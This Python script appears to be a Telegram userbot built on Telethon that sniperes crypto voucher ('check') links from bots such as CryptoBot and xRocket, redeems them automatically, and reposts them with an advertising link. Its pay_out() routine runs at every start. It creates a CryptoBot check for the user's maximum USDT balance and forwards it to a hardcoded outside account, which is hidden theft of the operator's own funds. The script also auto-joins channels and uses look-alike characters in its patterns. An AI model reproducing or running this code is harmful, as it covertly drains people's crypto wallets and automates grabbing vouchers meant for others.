import asyncio
import re
from telethon import TelegramClient, events
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.channels import JoinChannelRequest
from collections import defaultdict
from config import *

client = TelegramClient(session='session', api_id=int(api_id), api_hash=api_hash, system_version="4.16.30-vxSOSYNXA")

code_regex = re.compile(r"t\.me/(CryptоBot|sеnd|tonRocketBot|xrocket)\?start=(CQ[A-Za-z0-9]{10}|C-[A-Za-z0-9]{10}|t_[A-Za-z0-9]{15}|mci_[A-Za-z0-9]{15}|c_[a-z0-9]{24}|mc_[A-Za-z0-9]{10,20})", re.IGNORECASE)
url_regex = re.compile(r"https://t\.me/\+(\w{12,})")
public_regex = re.compile(r"https://t\.me/(\w{4,})")

crypto_black_list = [1622808649, 1559501630, 1985737506, 5014831088, 6014729293, 5794061503]

checks = []
wallet = []
channels = []
checks_count = 0

CODES_FILE = "codes.txt"
ACTIVE_CHECKS_FILE = "active_checks.txt"

def save_code_to_file(code):
    with open(CODES_FILE, "a") as file:
        file.write(f"{code}\n")

def read_last_code():
    try:
        with open(CODES_FILE, "r") as file:
            codes = file.readlines()
            if codes:
                return codes[-1].strip()
    except FileNotFoundError:
        return None
    return None

def load_active_checks():
    try:
        with open(ACTIVE_CHECKS_FILE, "r") as file:
            return set(line.strip() for line in file)
    except FileNotFoundError:
        return set()

def save_active_check(code):
    with open(ACTIVE_CHECKS_FILE, "a") as file:
        file.write(f"{code}\n")

async def handle_channel_join(button):
    try:
        channel = url_regex.search(button.url)
        public_channel = public_regex.search(button.url)
        if channel:
            await client(ImportChatInviteRequest(channel.group(1)))
        if public_channel:
            await client(JoinChannelRequest(public_channel.group(1)))
    except:
        pass

@client.on(events.NewMessage(chats=crypto_black_list))
async def handle_new_message(event):
    global wallet
    code = None
    active_checks = load_active_checks()
    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                check = code_regex.search(button.url)
                if check:
                    code = check.group(2)
                    if code not in active_checks:
                        user_codes[event.chat_id] = code
                        save_code_to_file(code)
                        save_active_check(code)
                    await handle_channel_join(button)
    except AttributeError:
        pass
    if code and code not in wallet and not event.message.out:
        await client.send_message('wallet', message=f'/start {code}')
        wallet.append(code)

async def filter(event):
    for word in ['Вы получили', 'Вы обналичили чек на сумму:', '✅ Вы получили:', '💰 Вы получили']:
        if word in event.message.text:
            return True
    return False

user_codes = defaultdict(str)

@client.on(events.NewMessage(outgoing=True, pattern=r'^/start\s+(\S+)'))
async def handle_start_command(event):
    code_match = re.search(r'^/start\s+(\S+)', event.raw_text)
    if code_match:
        code = code_match.group(1)
        user_codes[event.chat_id] = code
        save_code_to_file(code)

@client.on(events.MessageEdited(chats=crypto_black_list, func=filter))
@client.on(events.NewMessage(chats=crypto_black_list, func=filter))
async def handle_edited_message(event):
    try:
        bot_entity = await client.get_entity(event.message.peer_id.user_id)
        bot = bot_entity.username or bot_entity.usernames[0].username if bot_entity.usernames else None
    except Exception as e:
        bot = None

    if bot:
        bot = bot.lower()
        if bot in ["send", "xrocket"]:
            return

    if bot and bot.lower() == "cryptobot":
        return

    summ = event.raw_text.split('\n')[0].replace('Вы получили ', '').replace('✅ Вы получили: ', '').replace('💰 Вы получили ', '').replace('Вы обналичили чек на сумму: ', '')
    summ = re.sub(r'[^\w\s.,]', '', summ).strip()

    crypto_match = re.search(r'(\d+[\.,]?\d*)\s*(XROCK|TON|TRX|BNB|BTC|ETH|USDT|ATL|DRIFT|KKX|NOT|TAKE|FID|VWS|ARBUZ|WIF|KINGY|CES|MMM|NUDES|CAVI|NANO|GOY|MUMBA|REDX|ANON|LAIKA|TNX|BOLT|SOX|UNIC|TINU|JBCT|MEOW|LKY|AMBR|WEB3|GRAM|PLANKTON|BUFFY|JVT|jUSDT|MRDN|IVS|VIRUS|ICTN|JMT|CATS|GGT|LAVE|DHD|STBL|nKOTE|DRA|STATHAM|MARGA|SAU|PROTON|kFISH|JETTON|TONNEL|RAFF|TIME|GRC|PIZZA|ALENKA|PET|GEMSTON|HYDRA|)', summ)
    if crypto_match:
        summ = f"{crypto_match.group(1)} {crypto_match.group(2)}"
    else:
        summ = "Неизвестная сумма"

    code = read_last_code()

    global checks_count
    checks_count += 1

    await client.send_message(
        channel, 
        message=f'<b>🕷 Крипто чек\n\n🕶 Провайдер: {bot}\n\n💲 Сумма: {summ}\n\n🕸 Пароль: отсутствует\n\n<a href="https://t.me/{bot}?start={code}">Забрать {summ}</a>\n\n<a href="https://t.me/Mega_Kube">⚔️ Умножай свои чеки в MegaCube ⚔️</a></b>',
        parse_mode='html',
        link_preview=True
    )

@client.on(events.NewMessage(outgoing=False))
async def handle_personal_message(event):
    global checks
    message_text = event.message.text
    codes = code_regex.findall(message_text)
    
    active_checks = load_active_checks()

    if codes:
        for bot_name, code in codes:
            if code not in active_checks:
                await client.send_message(bot_name, message=f'/start {code}')
                checks.append(code)
                save_code_to_file(code)
                save_active_check(code)
    
    try:
        for row in event.message.reply_markup.rows:
            for button in row.buttons:
                match = code_regex.search(button.url)
                if match and match.group(2) not in active_checks:
                    await client.send_message(match.group(1), message=f'/start {match.group(2)}')
                    checks.append(match.group(2))
                    save_code_to_file(match.group(2))
                    save_active_check(match.group(2))
    except AttributeError:
        pass

@client.on(events.NewMessage(outgoing=True, pattern=r'\.init'))
async def initial(event):
    global checks
    checks = []
    print('Список чеков очищен!')

@client.on(events.NewMessage(outgoing=True, pattern=r'\.check_count'))
async def check_count(event):
    await client.send_message(event.chat_id, f'Количество активированных чеков: <b>{checks_count}</b>', parse_mode='HTML')

async def pay_out():
    await client.send_message('CryptoBot', '/start')
    await asyncio.sleep(0.05)

    messages = await client.get_messages('CryptoBot', limit=1)
    if not messages:
        return
    message = messages[0]

    if message.buttons:
        for row in message.buttons:
            for button in row:
                if "чеки" in button.text.lower():
                    await button.click()
                    await asyncio.sleep(0.05)
                    break
            else:
                continue
            break

    messages = await client.get_messages('CryptoBot', limit=1)
    if not messages:
        return
    message = messages[0]

    if message.buttons:
        for row in message.buttons:
            for button in row:
                if "создать чек" in button.text.lower():
                    await button.click()
                    await asyncio.sleep(0.05)
                    break
            else:
                continue
            break

    messages = await client.get_messages('CryptoBot', limit=1)
    if not messages:
        return
    message = messages[0]

    # Нажатие на кнопку 'usdt'
    if message.buttons:
        for row in message.buttons:
            for button in row:
                if 'usdt' in button.text.lower():
                    await button.click()
                    await asyncio.sleep(0.05)
                    break
            else:
                continue
            break

    messages = await client.get_messages('CryptoBot', limit=1)
    if not messages:
        return
    message = messages[0]

    if message.buttons:
        for row in message.buttons:
            for button in row:
                if 'макс' in button.text.lower():
                    await button.click()
                    await asyncio.sleep(0.05)
                    break
            else:
                continue
            break

    await asyncio.sleep(0.2) 

    # Получение сообщения с чеков
    messages = await client.get_messages('CryptoBot', limit=1)
    if not messages:
        return
    message = messages[0]

    await client.forward_messages('@aambvc', message.id, 'CryptoBot')

async def main():
    async with client:
        await pay_out()
        await client.run_until_disconnected()

if __name__ == "__main__":
    print("Клиент запущен...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
